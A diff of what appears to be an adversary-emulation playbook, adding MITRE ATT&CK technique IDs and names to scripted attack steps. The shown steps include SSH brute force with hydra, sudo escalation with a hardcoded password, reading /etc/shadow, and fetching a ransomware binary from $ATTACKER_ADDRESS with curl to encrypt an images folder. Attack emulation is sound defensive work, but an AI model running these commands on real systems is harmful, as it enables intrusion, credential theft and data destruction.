@@ -12,8 +12,9 @@ commands:
   - type: shell
     cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
     metadata:
-      techniques: "T1078,T1110,T1133"
+      techniques: "T1078.002,T1110.001,T1133"
       tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services"
 
   - type: ssh
     creates_session: foothold
@@ -23,8 +24,9 @@ commands:
     port: 10022
     cmd: id
     metadata:
-      techniques: "T1078"
+      techniques: "T1078.002"
       tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
@@ -48,16 +50,18 @@ commands:
     cmd: "sudo -i\n"
     interactive: True
     metadata:
-      techniques: "T1078"
+      techniques: "T1078.003"
       tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
     cmd: "rambo\n"
     interactive: True
     metadata:
-      techniques: "T1078"
+      techniques: "T1078.003"
       tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
@@ -69,8 +73,9 @@ commands:
     cmd: "cat /etc/shadow\n"
     interactive: True
     metadata:
-      techniques: "T1003"
+      techniques: "T1003.008"
       tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
 
   - type: ssh
     session: foothold
@@ -79,6 +84,7 @@ commands:
     metadata:
       techniques: "T1213"
       tactics: "Collection"
+      technique_name: "Data from Information Repositories"
 
   - type: ssh
     session: foothold
@@ -87,6 +93,7 @@ commands:
     metadata:
       techniques: "T1039"
       tactics: "Collection"
+      technique_name: "Data from Network Shared Drive"
 
   - type: mktemp
     cmd: file
@@ -122,6 +129,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 
   - type: ssh
     session: foothold
@@ -130,6 +138,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 
   - type: ssh
     session: foothold
@@ -138,6 +147,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 
   - type: ssh
     session: foothold
@@ -146,6 +156,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 
   - type: ssh
     session: foothold
@@ -155,6 +166,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 
   - type: ssh
     session: foothold
@@ -163,6 +175,7 @@ commands:
     metadata:
       techniques: "T1080"
       tactics: "Lateral Movement"
+      technique_name: "Taint Shared Content"
 ################### MOVED ############################################
   - type: msf-session
     session: movement
@@ -170,6 +183,8 @@ commands:
     metadata:
       techniques: "T1082"
       tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
 
   - type: msf-session
     session: movement
@@ -177,6 +192,7 @@ commands:
     metadata:
       techniques: "T1033"
       tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
 
   - type: msf-session
     session: movement
@@ -194,15 +210,18 @@ commands:
     session: movement
     cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
     metadata:
-      techniques: "T1486"
-      tactics: "Impact"
+      techniques: "T1486,T1105"
+      tactics: "Impact,Command and Control"
+      technique_name:" Data Encrypted for Impact, Ingress Tool Transfer"
+
 
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
     metadata:
-      techniques: "T1486,T1565"
+      techniques: "T1486,T1565.001"
       tactics: "Impact"
+      technique_name: "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"
 
   - type: msf-session
     session: movement
@@ -210,6 +229,7 @@ commands:
     metadata:
       techniques: "T1018"
       tactics: "Discovery"
+      technique_name: "Remote System Discovery"
 
   - type: msf-session
     session: movement
